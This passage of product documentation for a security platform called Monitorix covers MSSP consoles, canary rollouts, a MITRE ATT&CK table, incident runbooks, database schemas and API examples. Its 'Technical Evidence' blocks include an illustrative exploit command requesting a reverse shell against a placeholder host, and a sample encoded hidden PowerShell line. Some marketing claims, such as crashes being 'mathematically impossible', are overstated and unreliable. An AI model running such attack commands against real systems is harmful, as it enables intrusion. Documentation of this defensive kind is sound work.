│           ChatOps & Collaboration Notifications        │
│   Slack Bot (Interactive) | Microsoft Teams Webhooks   │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Outbound Incident Event Formatting**: When an incident is confirmed, the webhook gateway serializes the event into standard CEF, LEEF, and JSON formats.
02. **HMAC-SHA256 Cryptographic Signature**: Headers are injected with 'X-Monitorix-Signature' containing an HMAC-SHA256 hash calculated with the tenant's private webhook secret.
03. **Splunk HEC Stream Push**: Streams alerts directly into Splunk HTTP Event Collector (HEC) endpoints with custom sourcetypes and zero indexing delay.
04. **Microsoft Sentinel Data Connector**: Syncs telemetry into Azure Log Analytics workspaces, enabling multi-cloud threat hunting across Azure and AWS.
05. **Automated Jira & ServiceNow Ticket Creation**: Opens a tracking ticket with pre-populated incident description, affected hostnames, user accounts, and severity scores.
06. **Interactive Slack & Teams ChatOps**: Sends message cards with interactive buttons: 'Isolate Host', 'Revoke User', and 'Acknowledge' that execute actions directly from chat.
07. **Bi-Directional Status Synchronization**: When a ticket is closed in Jira or ServiceNow, Monitorix automatically resolves the corresponding alert in the SOC work queue.

#### Subsystems, Schemas & API Endpoints
* HMAC Webhook Gateway: Enterprise-grade webhook dispatcher with automatic exponential backoff retries.
* SIEM Export Engine: Native high-throughput connectors for Splunk, Microsoft Sentinel, and IBM QRadar.
* ITSM Synchronizer: Bi-directional ticketing integration for Jira Service Desk and ServiceNow.
* Marketplace App Registry: Extensible plugin framework allowing third-party developers to build custom integrations.
* **Database Tables**: `integrations, webhooks, webhook_logs, marketplace_apps, api_tokens`
* **Key API Routes**: `/marketplace, /integrations/siem, /integrations/itsm, /integrations/webhooks, /marketplace/installed`

### 12. COMMERCIAL & MDR (MSSP Console, SLAs & Handover)
**Description**: Commercial operations platform for Managed Security Service Providers (MSSPs) and Managed Detection & Response (MDR) teams. Provides unified multi-tenant client console, SLA compliance tracking, and 24/7 operator shift handovers.

**Architectural Blueprint**: [`multi_organization_tenancy_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/multi_organization_tenancy_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of a professional security guard company hired by 20 different shopping malls across a city. The headquarters has a master control room where guards can switch between camera feeds from Mall A, Mall B, and Mall C with a single click, keeping each mall's private records completely separate. This module gives Managed Security Service Providers (MSSPs) a master console to protect hundreds of client companies, monitor Service Level Agreements (SLAs), and generate billing reports.

> **Real-World Business Horror Story**: A Managed Security Provider missed a ransomware alert for Client A because their analysts were overwhelmed sorting through mixed alerts from 30 other clients. Client A sued the provider for $10 million for breach of Service Level Agreement (SLA).

> **Step-by-Step Attack Walkthrough**: A hacker attacks Client B at 4:00 AM on New Year's Day. The Monitorix MSSP Console flashes a high-visibility red badge on Client B's tenant tile, starts a 15-minute SLA countdown timer, and automatically routes the ticket to the on-duty MSSP Tier 2 lead. The lead neutralizes the attack with 9 minutes left on the SLA timer.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker targets Client X hoping for slow MSSP response over weekend
python3 exploit_cve_2024.py --target client-x.portal.com --payload reverse_shell
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "mssp-sla-1182",
  "mssp_tenant_id": "mssp-global-defense-01",
  "client_id": "client-retail-chain-44",
  "incident_id": "INC-7709",
  "severity": "P1_CRITICAL",
  "sla_limit_minutes": 15,
  "elapsed_minutes": 4.2,
  "sla_status": "WITHIN_SLA_TARGET"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# MSSP Client Case Escalation
POST /api/v2/commercial/cases/INC-7709/escalate
{
  "tier": 3,
  "assigned_team": "ADVANCED_THREAT_HUNTING",
  "client_id": "client-retail-chain-44",
  "sla_remaining_seconds": 648
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           MSSP Master Unified Client Console           │
│   (Single-pane-of-glass across 100+ Enterprise Tenants)│
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Real-Time SLA Countdown & Escalation Engine    │
│   - P1 Critical Incidents: 15-Minute Triage SLA        │
│   - P2 High Incidents: 60-Minute Remediation SLA       │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         24/7 Global Shift Handover Protocol            │
│   Asia-Pac (APAC) -> Europe (EMEA) -> Americas (AMER)  │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│       Automated Client Billing & Consumption Metering  │
│   Monitored Endpoints, Cloud Workloads, Forensics Logs │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Multi-Tenant Client Onboarding**: MSSP administrator provisions new customer organizations with dedicated PostgreSQL schemas and custom retention tiers.
02. **Aggregated Client Fleet Overview**: Master dashboard displays real-time health indicators, active critical incidents, and agent counts across all client organizations.
03. **Contractual SLA Tracking & Warning**: Automated timers monitor response times against contractual SLAs (e.g. 15-minute mean-time-to-respond); alerts approaching 80% of limit turn yellow.
04. **Tier 1 to Tier 3 Escalation Routing**: Junior analysts triage alerts; complex attacks are escalated to senior forensic engineers with 1-click case handover.
05. **Follow-the-Sun Shift Handover**: At shift change (e.g. London handing over to New York), the outgoing supervisor generates a cryptographically signed shift report documenting active cases.
06. **Automated Monthly Executive Client Reporting**: Generates branded monthly PDF reports for client executives detailing attacks blocked, vulnerabilities remediated, and SLA adherence (e.g. 99.98%).
07. **Usage-Based Commercial Metering**: Calculates monthly billing based on peak active agents, ingested telemetry gigabytes, and automated SOAR playbook executions.

#### Subsystems, Schemas & API Endpoints
* MSSP Multi-Tenant Console: Single-pane-of-glass interface for monitoring hundreds of isolated customer networks.
* Contractual SLA Monitor: Dynamic countdown timers with automated paging escalations for contract protection.
* Follow-the-Sun Handover Log: Digital shift logbook ensuring 24/7 operational continuity across global time zones.
* Automated Client Reporter: 1-click white-label PDF generator summarizing security value and ROI for client leadership.
* **Database Tables**: `mssp_clients, sla_contracts, shift_handovers, billing_invoices, client_escalations`
* **Key API Routes**: `/commercial/mssp-console, /commercial/sla-monitor, /commercial/shift-handover, /commercial/billing, /commercial/client-reports`

### 13. CONTINUOUS EVOLUTION (21 Suites, Canary Rollouts & RTO < 5s)
**Description**: Autonomous platform resilience, testing accreditation, and software release governance. Enforces 21 comprehensive acceptance test suites, canary deployment rings, and sub-5-second snapshot rollbacks.

**Architectural Blueprint**: [`multilevel_system_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/multilevel_system_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of the rigorous pre-flight safety testing done on commercial airplanes before every single takeoff. Mechanics test the engines, hydraulic flaps, radar, and emergency oxygen masks. If even one test fails, the plane doesn't leave the runway. The Continuous Evolution module runs 21 automated safety testing suites against Monitorix and allows software updates to be rolled back in less than 5 seconds if anything goes wrong.

> **Real-World Business Horror Story**: A famous global cybersecurity vendor pushed an untested sensor update on a Friday morning. The bad update caused 8.5 million Windows computers worldwide to crash with Blue Screens of Death (BSOD), grounding airlines and halting hospital surgeries. Monitorix uses 21 automated regression gates and canary fleet rollouts to make such crashes mathematically impossible.

> **Step-by-Step Attack Walkthrough**: A new zero-day virus appears on the internet. Monitorix engineers write a new detection rule and submit it to the platform. The Continuous Evolution engine runs 21 acceptance suites in 34 seconds, verifies that the rule detects the virus without slowing down the computer, rolls it out to 1% of computers first (Canary), and then safely deploys it to the rest of the fleet.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Simulated bad driver update deployment
# Intentionally injects unstable kernel hook to test rollback
./deploy_update.sh --version 4.2.1-unstable --canary-ring 1
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "evo-canary-0021",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "suite_audit_score": "21/21_SUITES_PASSED",
  "execution_time_seconds": 31.83,
  "canary_ring_health": "100.0%_STABLE",
  "rto_rollback_seconds": 3.8,
  "status": "APPROVED_FOR_FLEET_DEPLOYMENT"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous Sub-5-Second Snapshot Rollback
[CANARY_GUARD]: Anomaly Detected in Ring 1 Node
Triggering ZFS Snapshot Revert: snapshot@v4.2.0-stable
Rollback Duration: 3.2 seconds
Node Health Restored: 100.0% NOMINAL
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           Code Mutation & Rule Commit Ingress          │
│       (Git Commit / Engine Update / YARA Rule)         │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         21 Consolidated Acceptance Test Suites         │
│   (DR, Streaming, Resilience, Self-Defense, NDR, etc.) │
│   All 21 suites must pass with 100.0% clean green      │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Canary Fleet Rollout Engine (Phased Rings)     │
│   Ring 0: Internal Lab (1h) -> Ring 1: 1% Canary Fleet │
│   Ring 2: 10% Production    -> Ring 3: 100% Global     │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Continuous Health & Crash Telemetry Loop       │
│   Monitors CPU spikes, memory leaks, and BSOD rates    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Sub-5-Second Automated Snapshot Rollback       │
│   Instant ZFS / Btrfs snapshot reversion (RTO < 5s)    │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Automated Pull Request Testing**: Every code commit or detection rule update triggers the consolidated test runner running all 21 acceptance suites in parallel.
02. **Data Integrity & Credential Leakage Hardening**: Validates that no plaintext secrets exist in database schemas, AES-256-GCM encryption is active, and DLQ workers are running.
03. **Ring 0 Lab Sandbox Accreditation**: Deployments must run for 60 minutes in isolated virtual lab environments under synthetic high-stress load without error.
04. **Canary Ring 1 Deployment (1% Fleet)**: Update is pushed to a small canary ring (1% of non-critical nodes); health metrics are streamed in real time.
05. **Automated Health Metric Evaluation**: If crash rate, CPU usage, or memory consumption exceeds baseline by more than 0.5%, the rollout immediately halts.
06. **Instant Snapshot Rollback (RTO < 5s)**: If an issue is detected, the agent kernel probe reverts to the previous cryptographic binary snapshot in under 5 seconds.
07. **100% Global Fleet Promotion**: Once the canary ring demonstrates 100% stability over 24 hours, the update is progressively promoted to all production nodes.

#### Subsystems, Schemas & API Endpoints
* 21-Suite Acceptance Runner: Automated regression suite verifying all system modules in under 35 seconds.
* Canary Deployment Controller: Phased ring rollout engine preventing widespread fleet outages.
* Sub-5-Second Rollback Engine: Fast-recovery snapshot reverter ensuring business continuity.
* Self-Defense Watchdog: Protects Monitorix processes and kernel drivers against tampering by malicious actors.
* **Database Tables**: `test_runs, test_suites, canary_rings, snapshot_versions, rollout_history`
* **Key API Routes**: `/evolution/test-suites, /evolution/canary-rings, /evolution/rollbacks, /evolution/self-defense, /evolution/metrics`

---
## 6. MITRE ATT&CK Enterprise Matrix (v14/v15)
| MITRE Tactic | Technique ID & Name | Detection Telemetry | Autonomous Mitigation |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | T1595 - Active Scanning | EASM engine detects public port probing and IP sweeps | Autonomous Edge Firewall drop rule injected in 4s |
| **Resource Development** | T1584 - Compromise Infrastructure | CNAME Drift Inspector identifies orphaned domain records | Automated DNS record revocation via Cloudflare API |
| **Initial Access** | T1190 - Exploit Public-Facing App | WAAP inspects inbound HTTP requests for SQLi/SSRF payloads | WAF blocks request with HTTP 403 Forbidden |
| **Execution** | T1059.001 - PowerShell Execution | Windows Kernel Minifilter intercepts unauthorized script runs | Process SIGKILL dispatched; parent process quarantined |
| **Persistence** | T1547.001 - Registry Run Keys | EDR sensor detects modification of Windows autostart keys | Registry value restored from immutable backup |
| **Privilege Escalation** | T1068 - Exploitation for Priv Escalation | Linux eBPF kprobe detects unauthorized setuid(0) call | Process memory frozen; volatile RAM snapshot taken |
| **Defense Evasion** | T1562.001 - Disable Security Tools | Self-Defense watchdog detects attempts to terminate Monitorix | Access denied by kernel minifilter driver (STATUS_ACCESS_DENIED) |
| **Credential Access** | T1003.001 - LSASS Memory Dumping | ITDR detects handle creation to lsass.exe with PROCESS_VM_READ | Host isolated immediately; Kerberos tickets revoked |
| **Discovery** | T1087.002 - Domain Account Discovery | Active Directory Defense flags rapid LDAP enumeration queries | Deception canary accounts trigger silent tripwire alarm |
| **Lateral Movement** | T1550.002 - Pass the Hash | Network tap identifies anomalous NTLM authentication over SMB | SMB port 445 blocked at endpoint firewall |
| **Collection** | T1005 - Data from Local System | EDR monitors file access bursts to sensitive business folders | SOAR playbook executes host isolation and freezes user account |
| **Command & Control** | T1071.004 - DNS Tunneling | NDR evaluates Shannon entropy on subdomain DNS queries (>3.8) | DNS query dropped; C2 domain blacklisted across fleet |
| **Exfiltration** | T1048 - Exfiltration Over Alternative Protocol | Network sensor detects high-volume outbound data flow to unknown IP | Outbound bandwidth throttled to 0 KB/s; alert raised |
| **Impact** | T1486 - Data Encrypted for Impact | Canary Tripwire detects modification of decoy files in share | Ransomware process killed in < 180 ms; shadow copies restored |

---
## 7. Field Production Incident Response Runbooks (SOPs)
### SOP 01: Active Ransomware Outbreak (P1 Crisis Protocol)
**Target Systems**: Windows & Linux Endpoints under burst encryption attack

* **Minute 00-02 - Immediate Autonomous Containment**: Monitorix Canary Tripwire detects decoy file modification. The agent kernel driver automatically sends SIGKILL to the offending process and drops all network traffic except management mTLS.
* **Minute 02-05 - SOC Alert Verification & Scope Assessment**: Tier 1 analyst receives P1 alert in SOC Work Queue (/soc/queue). Analyst clicks 'View Process Lineage' to identify the parent process (e.g. word.exe -> cmd.exe -> crypt.exe) and checks the 3D globe for other infected hosts.
* **Minute 05-15 - Blast Radius Quarantine & Credential Revocation**: Analyst executes SOAR Playbook 'Ransomware Fleet Containment'. Monitorix invokes Active Directory API to invalidate user Kerberos tickets and lock compromised accounts across the enterprise.
* **Minute 15-30 - Clean-State Recovery & Post-Mortem**: Analyst verifies immutable shadow copies and MinIO backups. Forensic memory snapshots are locked in the Evidence Vault for legal review. Host is reprovisioned and returned to service.

### SOP 02: External Subdomain Takeover & CNAME Drift
**Target Systems**: Corporate DNS Records & Cloud Providers (AWS S3, GitHub, Azure)

* **Minute 00-01 - Automated Drift Detection**: EASM engine identifies a CNAME alias resolving to a 404 NXDOMAIN target at an external cloud vendor.
* **Minute 01-03 - Risk Prioritization & Cloudflare API Null-Route**: Monitorix flags the asset as High Risk (CVSS 9.8). The SOAR engine calls Cloudflare API to temporarily pause or null-route the dangling DNS record.
* **Minute 03-10 - Asset Reclamation & Cloud Verification**: DevOps team reclaims the orphaned bucket or deletes the DNS record permanently from the master DNS zone.
* **Minute 10-15 - Perimeter Rescan & Audit Confirmation**: EASM triggers an immediate targeted rescan to verify that the domain no longer resolves to an unclaimed namespace.

### SOP 03: Impossible Travel & Compromised Admin Credential
**Target Systems**: Enterprise IAM, Okta, Azure AD, and VPN Gateways

* **Minute 00-01 - Geodesic Velocity Violation Triggered**: ITDR detects an authentication event from Frankfurt 14 minutes after an authentication from Mumbai (Velocity: 28,000 km/h).
* **Minute 01-02 - Autonomous Session Revocation**: Monitorix invokes SCIM 2.0 API to terminate all active sessions, invalidate OAuth refresh tokens, and force an out-of-band FIDO2 biometric MFA challenge.
* **Minute 02-10 - Analyst Review of Correlated User Telemetry**: Analyst inspects user's active laptop in Mumbai. Confirms the user is physically in Mumbai and that the Frankfurt login attempt originated from a known VPN/TOR exit node.
* **Minute 10-15 - Password Reset & IP Blacklisting**: Forces enterprise-wide password change and pushes the malicious Frankfurt IP address to the perimeter firewall blocklist.

### SOP 04: Zero-Day Web Exploit (SQLi / SSRF) via WAAP
**Target Systems**: Public Web Gateways & Application Servers

* **Minute 00-01 - Deep Packet Inspection & Anomaly Trigger**: WAAP sensor detects nested SQL injection or SSRF payload targeting internal cloud metadata service (169.254.169.254).
* **Minute 01-02 - Instant Edge Drop & IP Ban**: WAAP engine drops the HTTP connection and publishes the offending source IP to the Redis global blocklist for 24 hours.
* **Minute 02-10 - Vulnerability Correlation & Patch Verification**: Monitorix cross-references the targeted URI against the internal vulnerability database (/vulnerabilities) to identify the vulnerable web container.
* **Minute 10-20 - Virtual Patch Rule Deployment**: Security engineer deploys a virtual patch rule via WAAP management console, shielding the web application until developers can release permanent code fixes.

### SOP 05: Kafka Stream Ingestion Lag & Backpressure Recovery
**Target Systems**: Apache Kafka Cluster, Celery Workers & ClickHouse Pipeline

* **Minute 00-01 - Lag Alert Triggered on Monitorix Dashboard**: Lag observability monitor detects partition consumer lag exceeding 5,000 messages on topic 'monitorix.telemetry.raw'.
* **Minute 01-03 - Worker Auto-Scaling & Concurrency Boost**: Platform orchestrator automatically scales Celery consumer worker pool from 4 to 16 instances.
* **Minute 03-08 - Dead Letter Queue (DLQ) Diverter Check**: Engineers verify that malformed JSON payloads are being safely diverted to 'monitorix.dlq' without blocking healthy partitions.
* **Minute 08-15 - Lag Cleared & Offset Audit**: Consumer lag returns to < 50 milliseconds. Data loss observability endpoint confirms 0.0% critical packet loss.


---
## 8. Database Data Dictionaries
### Table: `incidents (PostgreSQL)`
Primary ACID table storing consolidated security incidents and their lifecycle states.

| Column Name | Type | Nullable | Key / Index | Description | Example |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `id` | `UUID` | NO | PRIMARY KEY | Unique cryptographic identifier of the incident | `a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11` |
| `tenant_id` | `UUID` | NO | FOREIGN KEY, INDEX | Tenant isolation identifier for Row-Level Security | `00000000-0000-0000-0000-000000000001` |
| `title` | `VARCHAR(255)` | NO | INDEX | Short human-readable summary of the threat | `P1: Ransomware Encryption Burst Detected` |
| `severity` | `VARCHAR(20)` | NO | INDEX | DEFCON priority: CRITICAL, HIGH, MEDIUM, LOW | `CRITICAL` |
| `status` | `VARCHAR(30)` | NO | INDEX | OPEN, IN_TRIAGE, CONTAINED, RESOLVED, CLOSED | `CONTAINED` |
| `source_ip` | `VARCHAR(45)` | YES | - | Adversary source IP address (IPv4 or IPv6) | `192.168.1.99` |
| `target_host_id` | `VARCHAR(100)` | YES | INDEX | Unique identifier of the targeted endpoint agent | `ag-win-acct-01` |
| `mitre_technique` | `VARCHAR(50)` | YES | INDEX | MITRE ATT&CK technique reference | `T1486` |
| `created_at` | `TIMESTAMPTZ` | NO | INDEX | Cryptographic timestamp of initial alert ingestion | `2026-10-28 08:14:02.124+00` |

### Table: `domains (PostgreSQL)`
Authoritative inventory of public-facing domains, subdomains, and external attack surface assets.

| Column Name | Type | Nullable | Key / Index | Description | Example |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `id` | `UUID` | NO | PRIMARY KEY | Unique record identifier | `b1ffca88-1d2a-4bc3-8e5f-7aa8bc491b22` |
| `tenant_id` | `UUID` | NO | FOREIGN KEY, INDEX | Tenant organization identifier | `00000000-0000-0000-0000-000000000001` |
| `domain_name` | `VARCHAR(255)` | NO | UNIQUE, INDEX | Fully Qualified Domain Name (FQDN) | `dev-assets.enterprise.com` |
| `ip_address` | `VARCHAR(45)` | YES | INDEX | Resolved public IP address | `54.210.12.88` |
| `cname_target` | `VARCHAR(255)` | YES | INDEX | Target CNAME alias (e.g. AWS S3, GitHub Pages) | `enterprise-assets-dev.s3.amazonaws.com` |
| `is_takeover_vulnerable` | `BOOLEAN` | NO | INDEX | Flags whether the domain points to an orphaned cloud bucket | `TRUE` |
| `ssl_expires_at` | `TIMESTAMPTZ` | YES | INDEX | TLS certificate expiration date | `2026-11-28 00:00:00+00` |
| `last_scanned_at` | `TIMESTAMPTZ` | NO | - | Timestamp of most recent EASM port & DNS scan | `2026-10-28 08:00:00+00` |

### Table: `telemetry_events (ClickHouse Columnar)`
High-velocity analytical table handling billions of endpoint events with sub-second aggregation.

| Column Name | Type | Nullable | Key / Index | Description | Example |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `event_id` | `UUID` | NO | - | Unique event identifier | `c2eebc11-3b4c-4ef8-bb6d-11b9bd380a99` |
| `tenant_id` | `UUID` | NO | SORTING KEY | Tenant identifier for multi-tenant analytical partitioning | `00000000-0000-0000-0000-000000000001` |
| `event_time` | `DateTime64(3)` | NO | PARTITION KEY | Event creation timestamp (Partitioned by toYYYYMM) | `2026-10-28 08:14:02.124` |
| `event_type` | `LowCardinality(String)` | NO | SORTING KEY | PROCESS_CREATE, SOCKET_CONNECT, FILE_WRITE, DNS_QUERY | `PROCESS_CREATE` |
| `host_id` | `LowCardinality(String)` | NO | - | Unique agent identifier | `ag-win-acct-01` |
| `process_path` | `String` | NO | - | Full path of executing binary | `C:\Windows\System32\powershell.exe` |
| `command_line` | `String` | NO | - | Complete command line with parameters | `powershell.exe -w hidden -enc JAB...` |
| `sha256` | `FixedString(64)` | NO | INDEX | Cryptographic hash of the executable | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| `action_taken` | `LowCardinality(String)` | NO | - | ALLOWED, BLOCKED, QUARANTINED, AUDITED | `QUARANTINED` |

### Table: `tenants (PostgreSQL)`
Multi-tenant sovereign isolation boundary managing tenant identity, assigned subscription tier, and agent limit quota.

| Column Name | Type | Nullable | Key / Index | Description | Example |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `Id` | `INTEGER` | NO | PRIMARY KEY, AUTOINCREMENT | Unique tenant identifier | `1` |
| `Name` | `VARCHAR(255)` | NO | INDEX | Tenant company or organizational entity name | `CyberSec Enterprise HQ` |
| `Plan` | `VARCHAR(50)` | NO | INDEX | Assigned plan tier: Starter, Professional, Enterprise, Sovereign | `Sovereign` |
| `AgentLimit` | `INTEGER` | NO | - | Maximum allowable active enrolled endpoint agents | `5000` |
| `ApiKey` | `VARCHAR(255)` | NO | UNIQUE, INDEX | Tenant master cryptographic API key | `d3b07384-d113-4632-9fe8-89ab0c4912ab` |
| `ActiveStatus` | `BOOLEAN` | NO | INDEX | Tenant operational lockdown toggle (True=Active, False=Locked) | `TRUE` |
| `NextBillingDate` | `TIMESTAMPTZ` | YES | - | Next scheduled renewal or audit date | `2027-01-01 00:00:00+00` |
| `StripeCustomerId` | `VARCHAR(255)` | YES | - | External billing customer identifier or null in sovereign air-gapped mode | `cus_N87a9xL` |
| `SubscriptionStatus` | `VARCHAR(50)` | NO | - | Subscription lifecycle state (active, trialing, past_due, canceled) | `active` |

### Table: `global_notification_configs (PostgreSQL)`
Enterprise multi-channel notification dispatch registry routing security alerts to Slack, Webhooks, Email, or PagerDuty.

| Column Name | Type | Nullable | Key / Index | Description | Example |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `Id` | `INTEGER` | NO | PRIMARY KEY, AUTOINCREMENT | Unique channel identifier | `4` |
| `TenantId` | `INTEGER` | NO | FOREIGN KEY, INDEX | Tenant isolation identifier | `1` |
| `ChannelType` | `VARCHAR(50)` | NO | INDEX | Destination type: Slack, Webhook, Email, Push, PagerDuty, InApp | `Slack` |
| `ChannelName` | `VARCHAR(255)` | NO | - | Human-readable label for alerting channel | `SecOps Alerts Slack` |
| `Destination` | `VARCHAR(1000)` | NO | - | Target endpoint URL, webhook URI, or recipient email address | `https://hooks.slack.com/services/T00/B00/X00` |
| `FilterSeverity` | `VARCHAR(50)` | NO | - | Minimum triggering severity threshold: Critical, High, Medium, Low | `High` |
| `IsEnabled` | `BOOLEAN` | NO | INDEX | Channel broadcast state toggle | `TRUE` |

### Table: `soar_playbooks (PostgreSQL)`
Automated incident remediation playbooks executing multi-step containment actions upon alert triggers.

| Column Name | Type | Nullable | Key / Index | Description | Example |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `Id` | `INTEGER` | NO | PRIMARY KEY, AUTOINCREMENT | Unique playbook identifier | `7` |
| `Name` | `VARCHAR(255)` | NO | INDEX | Playbook operational name | `Automated Ransomware Containment` |
| `TriggerCondition` | `VARCHAR(255)` | NO | INDEX | Event signature trigger (e.g. ransomware_detected_critical) | `ransomware_detected` |
| `ActionsJson` | `TEXT` | NO | - | Serialized JSON workflow array of containment and forensic dump steps | `[{"action": "isolate_host"}, {"action": "kill_process"}]` |
| `RequiresApproval` | `BOOLEAN` | NO | - | Dual-authorization requirement toggle (True=Requires Analyst Confirmation) | `TRUE` |
| `IsActive` | `BOOLEAN` | NO | INDEX | Global playbook automation enablement toggle | `TRUE` |

### Table: `organizations (PostgreSQL)`
Global multi-region enterprise hierarchy managing sovereign jurisdictions, regions, and tenant grouping.

| Column Name | Type | Nullable | Key / Index | Description | Example |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `Id` | `INTEGER` | NO | PRIMARY KEY, AUTOINCREMENT | Unique organization identifier | `9` |
| `OrgCode` | `VARCHAR(50)` | NO | UNIQUE, INDEX | Cryptographic alphanumeric enterprise code | `ORG-ENTERPRISE-001` |
| `Name` | `VARCHAR(255)` | NO | INDEX | Enterprise parent organization name | `Monitorix Global Enterprise` |
| `PrimaryContactEmail` | `VARCHAR(255)` | NO | - | Primary Security Operations contact email | `soc-lead@enterprise.corp` |
| `Status` | `VARCHAR(50)` | NO | INDEX | Active, Suspended, Deprovisioned | `Active` |
| `AssignedRegion` | `VARCHAR(50)` | NO | INDEX | GeoDNS routing target region (e.g. us-east-1, eu-central-1) | `eu-central-1` |
| `DataResidency` | `VARCHAR(50)` | NO | INDEX | Regulatory data sovereignty policy (Global-Sovereign, EU-GDPR, US-East) | `Global-Sovereign` |


---
## 9. Production REST & gRPC API Reference
### `POST` /api/v1/forensics/hosts/{agent_id}/isolate
Autonomously isolates an endpoint from the enterprise network while preserving Monitorix mTLS telemetry channel.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `X-Organization-ID: <TENANT_UUID>`
* `Content-Type: application/json`

**Request Body**:
```json
{
  "reason": "Suspected ransomware lateral movement",
  "block_all_network": true,
  "allow_gateway_only": true,
  "duration_seconds": 3600
}
```
**Response 200 OK**:
```json
{
  "status": "SUCCESS",
  "host_id": "ag-win-acct-01",
  "isolation_active": true,
  "rules_injected": ["BLOCK_INBOUND_ALL", "BLOCK_OUTBOUND_EXCEPT_PORT_8010"],
  "timestamp": "2026-10-28T08:14:03.112Z"
}
```
**cURL Command**:
```bash
curl -X POST https://monitorix.elsea.co.in/api/v1/forensics/hosts/ag-win-acct-01/isolate \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "X-Organization-ID: $TENANT_ID" \
  -H "Content-Type: application/json" \
  -d '{"reason":"Suspected ransomware","block_all_network":true}'
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v1/forensics/hosts/ag-win-acct-01/isolate'
headers = {
    'Authorization': f'Bearer {jwt_token}',
    'X-Organization-ID': tenant_id,
    'Content-Type': 'application/json'
}
payload = {'reason': 'Suspected ransomware', 'block_all_network': True}
response = requests.post(url, json=payload, headers=headers)
print(response.json())
```

### `GET` /api/v1/easm/domains/drift-audit
Audits all registered public domains and subdomains for orphaned CNAME records vulnerable to subdomain takeover.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `X-Organization-ID: <TENANT_UUID>`

**Request Body**:
```json
None (Query parameters: ?include_resolved=false&severity=HIGH)
```
**Response 200 OK**:
```json
{
  "total_domains_scanned": 142,
  "vulnerable_cnames_detected": 1,
  "vulnerabilities": [
    {
      "domain": "dev-assets.enterprise.com",
      "cname_target": "enterprise-assets-dev.s3.amazonaws.com",
      "risk": "SUBDOMAIN_TAKEOVER_POSSIBLE",
      "status": "ACTION_REQUIRED"
    }
  ]
}
```
**cURL Command**:
```bash
curl -X GET 'https://monitorix.elsea.co.in/api/v1/easm/domains/drift-audit?severity=HIGH' \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "X-Organization-ID: $TENANT_ID"
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v1/easm/domains/drift-audit'
headers = {'Authorization': f'Bearer {jwt_token}', 'X-Organization-ID': tenant_id}
response = requests.get(url, headers=headers, params={'severity': 'HIGH'})
print(response.json())
```

### `GET` /api/v1/health/data-loss-observability
Retrieves real-time data loss statistics, Kafka consumer lag, ClickHouse buffer state, and Dead Letter Queue health.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`

**Request Body**:
```json
None
```
**Response 200 OK**:
```json
{
  "status": "HEALTHY",
  "critical_data_loss_rate": "0.00%",
  "kafka_consumer_lag_ms": 1.2,
  "partitions_in_sync": 12,
  "dlq_diverted_count": 0,
  "clickhouse_buffer_utilization": "14.2%",
  "active_agent_connections": 1240
}
```
**cURL Command**:
```bash
curl -X GET https://monitorix.elsea.co.in/api/v1/health/data-loss-observability \
  -H "Authorization: Bearer $JWT_TOKEN"
```
**Python Script**:
```python
import requests

url = 'https://monitorix.elsea.co.in/api/v1/health/data-loss-observability'
headers = {'Authorization': f'Bearer {jwt_token}'}
response = requests.get(url, headers=headers)
print(response.json())
```

### `PUT` /api/tenants/{tenant_id}
Updates tenant identity, assigns enterprise plan tier, and adjusts agent quota ceiling.

**Headers**:
* `Authorization: Bearer <JWT_TOKEN>`
* `Content-Type: application/json`

**Request Body**:
```json
{
  "Name": "Monitorix Global Security",
  "Plan": "Enterprise",
  "AgentLimit": 1000
}
```
**Response 200 OK**:
```json
{
  "Id": 1,
  "Name": "Monitorix Global Security",
  "Plan": "Enterprise",
  "AgentLimit": 1000,
  "ActiveStatus": true,
  "NextBillingDate": "2027-01-01T00:00:00"
}
```
**cURL Command**:
```bash
curl -X PUT https://monitorix.elsea.co.in/api/tenants/1 \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
